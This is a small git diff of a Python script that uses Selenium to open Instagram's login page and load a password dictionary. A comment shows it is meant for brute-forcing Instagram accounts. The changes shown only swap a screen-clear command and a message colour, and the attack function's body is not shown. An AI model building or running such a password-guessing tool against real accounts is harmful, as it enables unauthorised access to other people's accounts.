@@ -7,7 +7,7 @@ import time
 import os
 from termcolor import colored
 
-os.system('clear')
+os.system('cls')
 
 driver = webdriver.Chrome('chromedriver.exe')
 driver.get('https://www.instagram.com/accounts/login/')
@@ -22,7 +22,7 @@ try:
         passwords.append(line.strip('\n'))
     f.close()
 except:
-    print colored('Check path of dictionary','red')
+    print colored('Check path of dictionary','blue')
 
 #INSTAGRAM BLOCKS BRUTFORCE ATTACK WHEN 10 TIMES    
 def attack_code():
